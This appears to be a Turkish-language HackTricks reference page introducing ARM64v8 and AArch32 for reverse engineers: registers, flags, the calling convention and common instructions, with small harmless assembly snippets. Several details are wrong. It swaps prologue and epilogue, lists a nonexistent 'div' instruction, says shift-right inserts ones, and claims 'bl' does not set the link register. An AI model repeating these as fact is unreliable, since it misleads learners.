# ARM64v8'e Giriş

{{#include ../../../banners/hacktricks-training.md}}

## **İstisna Seviyeleri - EL (ARM64v8)**

ARMv8 mimarisinde, İstisna Seviyeleri (EL'ler) olarak bilinen yürütme seviyeleri, yürütme ortamının ayrıcalık seviyesini ve yeteneklerini tanımlar. EL0'dan EL3'e kadar dört istisna seviyesi vardır ve her biri farklı bir amaca hizmet eder:

1. **EL0 - Kullanıcı Modu**:
- Bu, en az ayrıcalıklı seviyedir ve normal uygulama kodunu yürütmek için kullanılır.
- EL0'da çalışan uygulamalar birbirlerinden ve sistem yazılımından izole edilmiştir, bu da güvenlik ve kararlılığı artırır.
2. **EL1 - İşletim Sistemi Çekirdek Modu**:
- Çoğu işletim sistemi çekirdeği bu seviyede çalışır.
- EL1, EL0'dan daha fazla ayrıcalığa sahiptir ve sistem kaynaklarına erişebilir, ancak sistem bütünlüğünü sağlamak için bazı kısıtlamalar vardır.
3. **EL2 - Hypervisor Modu**:
- Bu seviye sanallaştırma için kullanılır. EL2'de çalışan bir hypervisor, aynı fiziksel donanım üzerinde birden fazla işletim sistemini (her biri kendi EL1'inde) yönetebilir.
- EL2, sanallaştırılmış ortamların izolasyonu ve kontrolü için özellikler sağlar.
4. **EL3 - Güvenli İzleyici Modu**:
- Bu, en ayrıcalıklı seviyedir ve genellikle güvenli önyükleme ve güvenilir yürütme ortamları için kullanılır.
- EL3, güvenli ve güvenli olmayan durumlar (güvenli önyükleme, güvenilir OS vb.) arasındaki erişimleri yönetebilir ve kontrol edebilir.

Bu seviyelerin kullanımı, kullanıcı uygulamalarından en ayrıcalıklı sistem yazılımlarına kadar sistemin farklı yönlerini yönetmek için yapılandırılmış ve güvenli bir yol sağlar. ARMv8'in ayrıcalık seviyelerine yaklaşımı, farklı sistem bileşenlerini etkili bir şekilde izole etmeye yardımcı olur ve böylece sistemin güvenliğini ve dayanıklılığını artırır.

## **Kayıtlar (ARM64v8)**

ARM64, `x0` ile `x30` arasında etiketlenmiş **31 genel amaçlı kayıt** içerir. Her biri **64-bit** (8-byte) bir değeri saklayabilir. Sadece 32-bit değerler gerektiren işlemler için, aynı kayıtlara 32-bit modda `w0` ile `w30` isimleriyle erişilebilir.

1. **`x0`** ile **`x7`** - Genellikle geçici kayıtlar olarak ve alt programlara parametre geçişi için kullanılır.
- **`x0`**, bir fonksiyonun dönüş verisini de taşır.
2. **`x8`** - Linux çekirdeğinde, `x8`, `svc` talimatı için sistem çağrı numarası olarak kullanılır. **macOS'ta x16 kullanılır!**
3. **`x9`** ile **`x15`** - Daha fazla geçici kayıt, genellikle yerel değişkenler için kullanılır.
4. **`x16`** ve **`x17`** - **İç Prosedürel Çağrı Kayıtları**. Anlık değerler için geçici kayıtlardır. Ayrıca dolaylı fonksiyon çağrıları ve PLT (Prosedür Bağlantı Tablosu) stub'ları için de kullanılır.
- **`x16`**, **macOS**'ta **`svc`** talimatı için **sistem çağrı numarası** olarak kullanılır.
5. **`x18`** - **Platform kaydı**. Genel amaçlı bir kayıt olarak kullanılabilir, ancak bazı platformlarda bu kayıt platforma özgü kullanımlar için ayrılmıştır: Windows'ta mevcut iş parçacığı ortam bloğuna işaretçi veya Linux çekirdeğinde mevcut **yürütme görev yapısına** işaretçi.
6. **`x19`** ile **`x28`** - Bunlar çağrılan fonksiyon tarafından saklanan kayıtlardır. Bir fonksiyon, bu kayıtların değerlerini çağıran için korumalıdır, bu nedenle yığın içinde saklanır ve çağırana geri dönmeden önce geri alınır.
7. **`x29`** - Yığın çerçevesini takip etmek için **Çerçeve işaretçisi**. Bir fonksiyon çağrıldığında yeni bir yığın çerçevesi oluşturulduğunda, **`x29`** kaydı **yığında saklanır** ve **yeni** çerçeve işaretçisi adresi (**`sp`** adresi) **bu kayıtta saklanır**.
- Bu kayıt ayrıca **genel amaçlı bir kayıt** olarak da kullanılabilir, ancak genellikle **yerel değişkenlere** referans olarak kullanılır.
8. **`x30`** veya **`lr`** - **Bağlantı kaydı**. `BL` (Bağlantılı Dal) veya `BLR` (Bağlantılı Dal Kayıtına) talimatı yürütüldüğünde **dönüş adresini** tutar ve **`pc`** değerini bu kayıtta saklar.
- Bu kayıt, diğer kayıtlar gibi de kullanılabilir.
- Mevcut fonksiyon yeni bir fonksiyon çağıracaksa ve dolayısıyla `lr`'yi geçersiz kılacaksa, başlangıçta yığında saklayacaktır, bu epilogdur (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` ve `lr`'yi sakla, alan oluştur ve yeni `fp` al) ve sonunda geri alır, bu prologdur (`ldp x29, x30, [sp], #48; ret` -> `fp` ve `lr`'yi geri al ve dön).
9. **`sp`** - **Yığın işaretçisi**, yığının en üstünü takip etmek için kullanılır.
- **`sp`** değeri her zaman en az bir **quadword** **hizalaması** ile korunmalıdır, aksi takdirde hizalama hatası meydana gelebilir.
10. **`pc`** - **Program sayacı**, bir sonraki talimata işaret eder. Bu kayıt yalnızca istisna üretimleri, istisna dönüşleri ve dallar aracılığıyla güncellenebilir. Bu kaydı okuyabilen tek sıradan talimatlar, **`pc`** adresini **`lr`** (Bağlantı Kaydı) içinde saklamak için bağlantılı dal talimatlarıdır (BL, BLR).
11. **`xzr`** - **Sıfır kaydı**. 32-bit kayıt formunda **`wzr`** olarak da adlandırılır. Sıfır değerini kolayca almak için (yaygın işlem) veya **`subs`** kullanarak karşılaştırmalar yapmak için kullanılabilir, örneğin **`subs XZR, Xn, #10`** sonuç verisini hiçbir yere saklamadan ( **`xzr`** içinde).

**`Wn`** kayıtları, **`Xn`** kaydının **32bit** versiyonudur.

### SIMD ve Kayan Nokta Kayıtları

Ayrıca, optimize edilmiş tek talimat çoklu veri (SIMD) işlemlerinde ve kayan nokta aritmetiği gerçekleştirmek için kullanılabilecek başka **32 adet 128bit uzunluğunda kayıt** vardır. Bunlara Vn kayıtları denir, ancak **64**-bit, **32**-bit, **16**-bit ve **8**-bit modlarında da çalışabilirler ve bu durumda **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** ve **`Bn`** olarak adlandırılırlar.

### Sistem Kayıtları

**Yüzlerce sistem kaydı** vardır, ayrıca özel amaçlı kayıtlar (SPR'ler) olarak da adlandırılır ve **işlemcilerin** davranışını **izlemek** ve **kontrol etmek** için kullanılır.\
Sadece özel talimatlar olan **`mrs`** ve **`msr`** kullanılarak okunabilir veya ayarlanabilirler.

Özel kayıtlar **`TPIDR_EL0`** ve **`TPIDDR_EL0`** tersine mühendislik yaparken sıkça bulunur. `EL0` eki, kaydın erişilebileceği **minimum istisnayı** gösterir (bu durumda EL0, normal programların çalıştığı düzenli istisna (ayrıcalık) seviyesidir).\
Genellikle **iş parçacığına özgü depolama** bellek bölgesinin **temel adresini** saklamak için kullanılır. Genellikle ilki EL0'da çalışan programlar için okunabilir ve yazılabilir, ancak ikincisi EL0'dan okunabilir ve EL1'den (çekirdek gibi) yazılabilir.

- `mrs x0, TPIDR_EL0 ; TPIDR_EL0'ı x0'a oku`
- `msr TPIDR_EL0, X0 ; x0'ı TPIDR_EL0'a yaz`

### **PSTATE**

**PSTATE**, işletim sistemi görünür **`SPSR_ELx`** özel kaydına serileştirilmiş birkaç işlem bileşeni içerir, burada X, tetiklenen istisnanın **izin** **seviyesidir** (bu, istisna sona erdiğinde işlem durumunu geri almak için olanak tanır).\
Erişilebilir alanlar şunlardır:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`** ve **`V`** durum bayrakları:
- **`N`**, işlemin negatif bir sonuç verdiğini gösterir.
- **`Z`**, işlemin sıfır verdiğini gösterir.
- **`C`**, işlemin taşındığını gösterir.
- **`V`**, işlemin imzalı bir taşma verdiğini gösterir:
- İki pozitif sayının toplamı negatif bir sonuç verir.
- İki negatif sayının toplamı pozitif bir sonuç verir.
- Çıkarma işlemi sırasında, daha küçük bir pozitif sayıdan büyük bir negatif sayı çıkarıldığında (veya tersine), ve sonuç verilen bit boyutunun aralığında temsil edilemezse.
- Açıkça, işlemcinin işlemin imzalı olup olmadığını bilmediği için, C ve V'yi işlemlerde kontrol eder ve taşmanın imzalı veya imzasız olup olmadığını belirtir.

> [!WARNING]
> Tüm talimatlar bu bayrakları güncellemez. **`CMP`** veya **`TST`** gibi bazıları günceller ve **`ADDS`** gibi s son eki olan diğerleri de bunu yapar.

- Mevcut **kayıt genişliği (`nRW`) bayrağı**: Eğer bayrak 0 değerini tutuyorsa, program yeniden başlatıldığında AArch64 yürütme durumunda çalışacaktır.
- Mevcut **İstisna Seviyesi** (**`EL`**): EL0'da çalışan bir normal program 0 değerine sahip olacaktır.
- **Tek adım** bayrağı (**`SS`**): Hata ayıklayıcılar tarafından, bir istisna aracılığıyla **`SPSR_ELx`** içinde SS bayrağını 1 olarak ayarlayarak tek adım atmak için kullanılır. Program bir adım atacak ve tek adım istisnası verecektir.
- **Geçersiz istisna** durumu bayrağı (**`IL`**): Ayrıcalıklı bir yazılım geçersiz bir istisna seviyesi aktarımı gerçekleştirdiğinde işaretlemek için kullanılır, bu bayrak 1 olarak ayarlanır ve işlemci geçersiz durum istisnası tetikler.
- **`DAIF`** bayrakları: Bu bayraklar, ayrıcalıklı bir programın belirli dış istisnaları seçici olarak maskelemesine olanak tanır.
- Eğer **`A`** 1 ise, **asenkron abortların** tetikleneceği anlamına gelir. **`I`**, dış donanım **Kesme İsteklerine** (IRQ'lar) yanıt vermek için yapılandırılır. F ise **Hızlı Kesme İstekleri** (FIR'lar) ile ilgilidir.
- **Yığın işaretçisi seçme** bayrakları (**`SPS`**): EL1 ve üzerindeki ayrıcalıklı programlar, kendi yığın işaretçisi kaydı ile kullanıcı modeli arasında geçiş yapabilir (örneğin, `SP_EL1` ile `EL0` arasında). Bu geçiş, **`SPSel`** özel kaydına yazılarak gerçekleştirilir. Bu, EL0'dan yapılamaz.

## **Çağrı Sözleşmesi (ARM64v8)**

ARM64 çağrı sözleşmesi, bir fonksiyona **ilk sekiz parametrenin** **`x0` ile `x7`** kayıtlarında geçildiğini belirtir. **Ek** parametreler **yığında** geçilir. **Dönüş** değeri, **`x0`** kaydında veya **`x1`** kaydında **eğer 128 bit uzunluğundaysa** geri geçilir. **`x19`** ile **`x30`** ve **`sp`** kayıtları, fonksiyon çağrıları arasında **korunmalıdır**.

Bir fonksiyonu assembly dilinde okurken, **fonksiyon prologunu ve epilogunu** arayın. **Prolog**, genellikle **çerçeve işaretçisini (`x29`) saklamayı**, **yeni bir çerçeve işaretçisi** ayarlamayı ve **yığın alanı** ayırmayı içerir. **Epilog**, genellikle **saklanan çerçeve işaretçisini geri yüklemeyi** ve **fonksiyondan dönmeyi** içerir.

### Swift'te Çağrı Sözleşmesi

Swift'in kendi **çağrı sözleşmesi** vardır ve [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) adresinde bulunabilir.

## **Yaygın Talimatlar (ARM64v8)**

ARM64 talimatları genellikle **`opcode dst, src1, src2`** formatına sahiptir, burada **`opcode`** gerçekleştirilecek **işlemi** (örneğin `add`, `sub`, `mov` vb.) belirtir, **`dst`** sonucu saklayacak **hedef** kaydıdır ve **`src1`** ve **`src2`** **kaynak** kayıtlarıdır. Anlık değerler de kaynak kayıtları yerine kullanılabilir.

- **`mov`**: Bir **kayıttan** diğerine bir değeri **taşı**.
- Örnek: `mov x0, x1` — Bu, `x1`'den `x0`'a değeri taşır.
- **`ldr`**: **Bellekten** bir değeri bir **kayda** **yükle**.
- Örnek: `ldr x0, [x1]` — Bu, `x1` tarafından işaret edilen bellek konumundan bir değeri `x0`'a yükler.
- **Offset modu**: Orijinal işaretçiyi etkileyen bir offset belirtilir, örneğin:
- `ldr x2, [x1, #8]`, bu `x2`'ye `x1 + 8` değerini yükleyecektir.
- `ldr x2, [x0, x1, lsl #2]`, bu `x2`'ye `x0` dizisinden `x1` (indeks) \* 4 pozisyonundan bir nesne yükleyecektir.
- **Önceden indekslenmiş mod**: Bu, orijinal işaretçiye hesaplamalar uygular, sonucu alır ve ayrıca yeni orijinal işaretçiyi orijinalde saklar.
- `ldr x2, [x1, #8]!`, bu `x2`'ye `x1 + 8` yükler ve `x1`'de `x1 + 8` sonucunu saklar.
- `str lr, [sp, #-4]!`, Bağlantı kaydını sp'ye sakla ve sp kaydını güncelle.
- **Son indeks modu**: Bu, önceki gibi, ancak bellek adresine erişilir ve ardından offset hesaplanır ve saklanır.
- `ldr x0, [x1], #8`, `x1`'i `x0`'a yükler ve `x1`'i `x1 + 8` ile günceller.
- **PC'ye göre adresleme**: Bu durumda, yüklenecek adres PC kaydına göre hesaplanır.
- `ldr x1, =_start`, Bu, `_start` sembolünün başladığı adresi `x1`'e yükleyecektir.
- **`str`**: Bir **kayıttan** **belleğe** bir değeri **sakla**.
- Örnek: `str x0, [x1]` — Bu, `x0`'deki değeri `x1` tarafından işaret edilen bellek konumuna saklar.
- **`ldp`**: **Kayıt Çifti Yükle**. Bu talimat, **ardışık bellek** konumlarından iki kaydı **yükler**. Bellek adresi genellikle başka bir kayıttaki değere bir offset eklenerek oluşturulur.
- Örnek: `ldp x0, x1, [x2]` — Bu, `x0` ve `x1`'i sırasıyla `x2` ve `x2 + 8` konumlarından yükler.
- **`stp`**: **Kayıt Çifti Sakla**. Bu talimat, **ardışık bellek** konumlarına iki kaydı **saklar**. Bellek adresi genellikle başka bir kayıttaki değere bir offset eklenerek oluşturulur.
- Örnek: `stp x0, x1, [sp]` — Bu, `x0` ve `x1`'i sırasıyla `sp` ve `sp + 8` konumlarına saklar.
- `stp x0, x1, [sp, #16]!` — Bu, `x0` ve `x1`'i `sp+16` ve `sp + 24` konumlarına saklar ve `sp`'yi `sp+16` ile günceller.
- **`add`**: İki kaydın değerlerini toplar ve sonucu bir kayıtta saklar.
- Söz dizimi: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Hedef
- Xn2 -> Operatör 1
- Xn3 | #imm -> Operatör 2 (kayıt veya anlık)
- \[shift #N | RRX] -> Bir kaydırma gerçekleştir veya RRX çağır
- Örnek: `add x0, x1, x2` — Bu, `x1` ve `x2`'deki değerleri toplar ve sonucu `x0`'da saklar.
- `add x5, x5, #1, lsl #12` — Bu, 4096'ya eşittir (1, 12 kez kaydırıcı) -> 1 0000 0000 0000 0000
- **`adds`** Bu, bir `add` işlemi gerçekleştirir ve bayrakları günceller.
- **`sub`**: İki kaydın değerlerini çıkarır ve sonucu bir kayıtta saklar.
- **`add`** **söz dizimini** kontrol edin.
- Örnek: `sub x0, x1, x2` — Bu, `x2`'deki değeri `x1`'den çıkarır ve sonucu `x0`'da saklar.
- **`subs`** Bu, çıkarma işlemi gibidir ancak bayrağı günceller.
- **`mul`**: **İki kaydın** değerlerini çarpar ve sonucu bir kayıtta saklar.
- Örnek: `mul x0, x1, x2` — Bu, `x1` ve `x2`'deki değerleri çarpar ve sonucu `x0`'da saklar.
- **`div`**: Bir kaydın değerini diğerine böler ve sonucu bir kayıtta saklar.
- Örnek: `div x0, x1, x2` — Bu, `x1`'deki değeri `x2`'ye böler ve sonucu `x0`'da saklar.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Mantıksal kaydırma sola**: Sonundan 0 ekleyerek diğer bitleri ileri taşır (n kez 2 ile çarpma).
- **Mantıksal kaydırma sağa**: Başlangıcına 1 ekleyerek diğer bitleri geri taşır (imzasız olarak n kez 2 ile bölme).
- **Aritmetik kaydırma sağa**: **`lsr`** gibi, ancak en anlamlı bit 1 ise 0 eklemek yerine, 1 eklenir (imzalı olarak n kez 2 ile bölme).
- **Sağa döndürme**: **`lsr`** gibi, ancak sağdan çıkarılan her şey sola eklenir.
- **Genişletme ile sağa döndürme**: **`ror`** gibi, ancak taşıma bayrağı "en anlamlı bit" olarak kullanılır. Yani taşıma bayrağı bit 31'e taşınır ve çıkarılan bit taşıma bayrağına eklenir.
- **`bfm`**: **Bit Alanı Taşı**, bu işlemler **bir değerden `0...n` bitlerini kopyalar** ve bunları **`m..m+n`** pozisyonlarına yerleştirir. **`#s`**, **en soldaki bit** pozisyonunu ve **`#r`** **sağa döndürme miktarını** belirtir.
- Bit alanı taşıma: `BFM Xd, Xn, #r`
- İmzalı bit alanı taşıma: `SBFM Xd, Xn, #r, #s`
- İmzalı olmayan bit alanı taşıma: `UBFM Xd, Xn, #r, #s`
- **Bit alanı Çıkarma ve Ekleme:** Bir kayıttan bir bit alanını kopyalar ve başka bir kayda kopyalar.
- **`BFI X1, X2, #3, #4`** X1'in 3. bitinden X2'den 4 bit ekle.
- **`BFXIL X1, X2, #3, #4`** X2'nin 3. bitinden 4 bit çıkar ve X1'e kopyala.
- **`SBFIZ X1, X2, #3, #4`** X2'den 4 bit işaret uzatır ve X1'e 3. bit pozisyonundan ekler, sağdaki bitleri sıfırlar.
- **`SBFX X1, X2, #3, #4`** X2'den 3. bitten başlayarak 4 bit çıkarır, işaret uzatır ve sonucu X1'e yerleştirir.
- **`UBFIZ X1, X2, #3, #4`** X2'den 4 bit sıfır uzatır ve X1'e 3. bit pozisyonundan ekler, sağdaki bitleri sıfırlar.
- **`UBFX X1, X2, #3, #4`** X2'den 3. bitten başlayarak 4 bit çıkarır ve sıfır uzatılmış sonucu X1'e yerleştirir.
- **İmza Uzatma X'e:** Bir değerin imzasını (veya imzasız versiyonda sadece 0 ekler) uzatır, böylece onunla işlemler gerçekleştirebiliriz:
- **`SXTB X1, W2`** W2'den **X1'e** bir baytın imzasını uzatır (`W2`, `X2`'nin yarısıdır) 64bit doldurmak için.
- **`SXTH X1, W2`** W2'den **X1'e** 16 bitlik bir sayının imzasını uzatır 64bit doldurmak için.
- **`SXTW X1, W2`** W2'den **X1'e** bir baytın imzasını uzatır 64bit doldurmak için.
- **`UXTB X1, W2`** W2'den **X1'e** 0 ekler (imzasız) 64bit doldurmak için.
- **`extr`:** Belirtilen **bir çift kayıttan** bitleri çıkarır.
- Örnek: `EXTR W3, W2, W1, #3` Bu, **W1+W2'yi birleştirir** ve **W2'nin 3. bitinden W1'in 3. bitine kadar** alır ve W3'e saklar.
- **`cmp`**: İki kaydı **karşılaştırır** ve durum bayraklarını ayarlar. Bu, **`subs`**'ın bir takma adıdır ve hedef kaydı sıfır kaydına ayarlar. `m == n` olup olmadığını bilmek için yararlıdır.
- **`subs`** ile aynı söz dizimini destekler.
- Örnek: `cmp x0, x1` — Bu, `x0` ve `x1`'deki değerleri karşılaştırır ve durum bayraklarını buna göre ayarlar.
- **`cmn`**: Negatif **operandı karşılaştırır**. Bu durumda, bu bir **`adds`** takma adıdır ve aynı söz dizimini destekler. `m == -n` olup olmadığını bilmek için yararlıdır.
- **`ccmp`**: Koşullu karşılaştırma, bu, yalnızca önceki bir karşılaştırma doğruysa gerçekleştirilecek bir karşılaştırmadır ve özellikle nzcv bitlerini ayarlayacaktır.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> eğer x1 != x2 ve x3 < x4 ise, func'a atla.
- Bu, **`ccmp`**'nin yalnızca **önceki `cmp` bir `NE` ise** yürütüleceği anlamına gelir, eğer değilse `nzcv` bitleri 0 olarak ayarlanır (bu da `blt` karşılaştırmasını tatmin etmez).
- Bu, `ccmn` olarak da kullanılabilir (aynı ancak negatif, `cmp` ile `cmn` gibi).
- **`tst`**: Karşılaştırmanın değerlerinden herhangi birinin 1 olup olmadığını kontrol eder (sonucu hiçbir yere saklamadan ANDS gibi çalışır). Bir kaydı bir değerle kontrol etmek ve kaydın belirtilen değerindeki bitlerden herhangi birinin 1 olup olmadığını kontrol etmek için yararlıdır.
- Örnek: `tst X1, #7` X1'in son 3 bitinin 1 olup olmadığını kontrol et.
- **`teq`**: Sonucu göz ardı ederek XOR işlemi.
- **`b`**: Koşulsuz Dal.
- Örnek: `b myFunction`
- Not: Bu, dönüş adresi ile bağlantı kaydını doldurmaz (geri dönmesi gereken alt program çağrıları için uygun değildir).
- **`bl`**: **Bağlantı** ile dal, bir **alt programı** **çağırmak** için kullanılır. **Dönüş adresini `x30`'da** saklar.
- Örnek: `bl myFunction` — Bu, `myFunction` fonksiyonunu çağırır ve dönüş adresini `x30`'da saklar.
- Not: Bu, dönüş adresi ile bağlantı kaydını doldurmaz (geri dönmesi gereken alt program çağrıları için uygun değildir).
- **`blr`**: **Bağlantı** ile Kayıta Dal, hedefin **bir kayıtta** **belirtilmiş** olduğu bir **alt programı** **çağırmak** için kullanılır. Dönüş adresini `x30`'da saklar.
- Örnek: `blr x1` — Bu, `x1`'de bulunan adresi içeren fonksiyonu çağırır ve dönüş adresini `x30`'da saklar.
- **`ret`**: **Alt programdan** **dön**, genellikle **`x30`**'daki adresi kullanarak.
- Örnek: `ret` — Bu, mevcut alt programdan dönüş yapar ve dönüş adresini `x30`'da kullanır.
- **`b.<cond>`**: Koşullu dallar.
- **`b.eq`**: **Eşitse dal**, önceki `cmp` talimatına dayanarak.
- Örnek: `b.eq label` — Eğer önceki `cmp` talimatı iki eşit değer bulursa, bu `label`'a atlar.
- **`b.ne`**: **Eşit Değilse Dal**. Bu talimat, durum bayraklarını kontrol eder (önceki karşılaştırma talimatı tarafından ayarlanmıştır) ve karşılaştırılan değerler eşit değilse, bir etikete veya adrese dalar.
- Örnek: `cmp x0, x1` talimatından sonra, `b.ne label` — Eğer `x0` ve `x1`'deki değerler eşit değilse, bu `label`'a atlar.
- **`cbz`**: **Sıfır ile Karşılaştır ve Dal**. Bu talimat, bir kaydı sıfır ile karşılaştırır ve eğer eşitse, bir etikete veya adrese dalar.
- Örnek: `cbz x0, label` — Eğer `x0`'deki değer sıfırsa, bu `label`'a atlar.
- **`cbnz`**: **Sıfır Olmayan ile Karşılaştır ve Dal**. Bu talimat, bir kaydı sıfır ile karşılaştırır ve eğer eşit değilse, bir etikete veya adrese dalar.
- Örnek: `cbnz x0, label` — Eğer `x0`'deki değer sıfır değilse, bu `label`'a atlar.
- **`tbnz`**: Bit testi yap ve sıfır olmayan durumda dal.
- Örnek: `tbnz x0, #8, label`
- **`tbz`**: Bit testi yap ve sıfır durumunda dal.
- Örnek: `tbz x0, #8, label`
- **Koşullu seçim işlemleri**: Bu işlemler, koşullu bitlere bağlı olarak davranışlarını değiştirir.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Eğer doğruysa, X0 = X1, eğer yanlışsa, X0 = X2.
- `csinc Xd, Xn, Xm, cond` -> Eğer doğruysa, Xd = Xn, eğer yanlışsa, Xd = Xm + 1.
- `cinc Xd, Xn, cond` -> Eğer doğruysa, Xd = Xn + 1, eğer yanlışsa, Xd = Xn.
- `csinv Xd, Xn, Xm, cond` -> Eğer doğruysa, Xd = Xn, eğer yanlışsa, Xd = NOT(Xm).
- `cinv Xd, Xn, cond` -> Eğer doğruysa, Xd = NOT(Xn), eğer yanlışsa, Xd = Xn.
- `csneg Xd, Xn, Xm, cond` -> Eğer doğruysa, Xd = Xn, eğer yanlışsa, Xd = - Xm.
- `cneg Xd, Xn, cond` -> Eğer doğruysa, Xd = - Xn, eğer yanlışsa, Xd = Xn.
- `cset Xd, Xn, Xm, cond` -> Eğer doğruysa, Xd = 1, eğer yanlışsa, Xd = 0.
- `csetm Xd, Xn, Xm, cond` -> Eğer doğruysa, Xd = \<tüm 1>, eğer yanlışsa, Xd = 0.
- **`adrp`**: Bir sembolün **sayfa adresini** hesapla ve bir kayıtta sakla.
- Örnek: `adrp x0, symbol` — Bu, `symbol`'ün sayfa adresini hesaplar ve `x0`'da saklar.
- **`ldrsw`**: Bellekten **imzalı 32-bit** bir değeri **yükle** ve **64 bit'e işaret uzat**.
- Örnek: `ldrsw x0, [x1]` — Bu, `x1` tarafından işaret edilen bellek konumundan imzalı 32-bit bir değeri yükler, 64 bit'e işaret uzatır ve `x0`'da saklar.
- **`stur`**: Bir kayıt değerini bir bellek konumuna **sakla**, başka bir kayıttan bir offset kullanarak.
- Örnek: `stur x0, [x1, #4]` — Bu, `x0`'deki değeri `x1`'deki adresten 4 byte daha büyük olan bellek adresine saklar.
- **`svc`** : Bir **sistem çağrısı** yap. "Denetçi Çağrısı" anlamına gelir. İşlemci bu talimatı yürüttüğünde, **kullanıcı modundan çekirdek moduna** geçer ve **çekirdeğin sistem çağrı işleme** kodunun bulunduğu bellek konumuna atlar.

- Örnek:

```armasm
mov x8, 93  ; Çıkış için sistem çağrı numarasını (93) x8 kaydına yükle.
mov x0, 0   ; Çıkış durum kodunu (0) x0 kaydına yükle.
svc 0       ; Sistem çağrısını yap.
```

### **Fonksiyon Prologu**

1. **Bağlantı kaydını ve çerçeve işaretçisini yığına kaydet**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Yeni çerçeve işaretçisini ayarlayın**: `mov x29, sp` (mevcut fonksiyon için yeni çerçeve işaretçisini ayarlar)
3. **Yerel değişkenler için yığında alan ayırın** (gerekirse): `sub sp, sp, <size>` (burada `<size>` gerekli byte sayısıdır)

### **Fonksiyon Epilogü**

1. **Yerel değişkenleri serbest bırakın (eğer ayrıldıysa)**: `add sp, sp, <size>`
2. **Bağlantı kaydını ve çerçeve işaretçisini geri yükleyin**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (kontrolü çağırana döndürür, bağlantı kaydındaki adresi kullanarak)

## AARCH32 İcra Durumu

Armv8-A, 32-bit programların çalıştırılmasını destekler. **AArch32**, **`A32`** ve **`T32`** olmak üzere **iki talimat setinde** çalışabilir ve bunlar arasında **`interworking`** ile geçiş yapabilir.\
**Yetkili** 64-bit programlar, daha düşük yetkili 32-bit programların **çalıştırılmasını** sağlamak için bir istisna seviyesi transferi gerçekleştirerek programları planlayabilir.\
64-bit'ten 32-bit'e geçişin, istisna seviyesinin düşmesiyle gerçekleştiğini unutmayın (örneğin, EL1'deki bir 64-bit programın EL0'daki bir programı tetiklemesi). Bu, `AArch32` işlem süreci işleme alınmaya hazır olduğunda **`SPSR_ELx`** özel kaydının **bit 4'ünü 1** olarak ayarlayarak yapılır ve `SPSR_ELx`'in geri kalanı **`AArch32`** programlarının CPSR'sini saklar. Ardından, yetkili süreç **`ERET`** talimatını çağırır, böylece işlemci **`AArch32`**'ye geçer ve CPSR\*\*'ye bağlı olarak A32 veya T32'ye girer.\*\*

**`interworking`**, CPSR'nin J ve T bitleri kullanılarak gerçekleşir. `J=0` ve `T=0`, **`A32`** anlamına gelir; `J=0` ve `T=1`, **T32** anlamına gelir. Bu, temelde talimat setinin T32 olduğunu belirtmek için **en düşük bitin 1** olarak ayarlanması anlamına gelir.\
Bu, **interworking dal talimatları** sırasında ayarlanır, ancak PC hedef kayıt olarak ayarlandığında diğer talimatlarla da doğrudan ayarlanabilir. Örnek:

Başka bir örnek:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Kayıtlar

16 adet 32-bit kayıt (r0-r15) vardır. **r0'dan r14'e** kadar olanlar **herhangi bir işlem** için kullanılabilir, ancak bazıları genellikle ayrılmıştır:

- **`r15`**: Program sayacı (her zaman). Bir sonraki talimatın adresini içerir. A32'de mevcut + 8, T32'de mevcut + 4.
- **`r11`**: Çerçeve İşaretçisi
- **`r12`**: Prosedür içi çağrı kaydı
- **`r13`**: Yığın İşaretçisi
- **`r14`**: Bağlantı Kaydı

Ayrıca, kayıtlar **`banked registries`** içinde yedeklenir. Bu, kayıt değerlerini depolayan yerlerdir ve her seferinde kayıtları manuel olarak kaydetme ve geri yükleme ihtiyacını ortadan kaldırarak **hızlı bağlam değiştirme** işlemlerini gerçekleştirmeyi sağlar.\
Bu, istisna alındığında işlemci modunun **`CPSR`**'den **`SPSR`**'ye işlemci durumunu **kaydetmek** ile yapılır. İstisna geri döndüğünde, **`CPSR`** **`SPSR`**'den geri yüklenir.

### CPSR - Mevcut Program Durum Kaydı

AArch32'de CPSR, AArch64'teki **`PSTATE`** ile benzer şekilde çalışır ve ayrıca bir istisna alındığında daha sonra yürütmeyi geri yüklemek için **`SPSR_ELx`**'de saklanır:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Alanlar bazı gruplara ayrılmıştır:

- Uygulama Program Durum Kaydı (APSR): Aritmetik bayraklar ve EL0'dan erişilebilir
- Yürütme Durumu Kayıtları: Süreç davranışı (OS tarafından yönetilir).

#### Uygulama Program Durum Kaydı (APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** bayrakları (AArch64'teki gibi)
- **`Q`** bayrağı: Özel bir doygun aritmetik talimatın yürütülmesi sırasında **tam sayı doygunluğu meydana geldiğinde** 1 olarak ayarlanır. **`1`** olarak ayarlandığında, manuel olarak 0 olarak ayarlanana kadar bu değeri korur. Ayrıca, değerini dolaylı olarak kontrol eden herhangi bir talimat yoktur, bu manuel olarak okunmalıdır.
- **`GE`** (Büyüktür veya eşittir) Bayrakları: SIMD (Tek Talimat, Çoklu Veri) işlemlerinde kullanılır, örneğin "paralel toplama" ve "paralel çıkarma". Bu işlemler, tek bir talimatla birden fazla veri noktasını işleme imkanı tanır.

Örneğin, **`UADD8`** talimatı **dört çift baytı** (iki 32-bit operandından) paralel olarak toplar ve sonuçları 32-bit bir kayıtta saklar. Daha sonra bu sonuçlara dayanarak **`APSR`**'deki `GE` bayraklarını **ayarlar**. Her GE bayrağı, o bayt çiftinin toplamının **taşma** yapıp yapmadığını gösterir.

**`SEL`** talimatı, koşullu eylemleri gerçekleştirmek için bu GE bayraklarını kullanır.

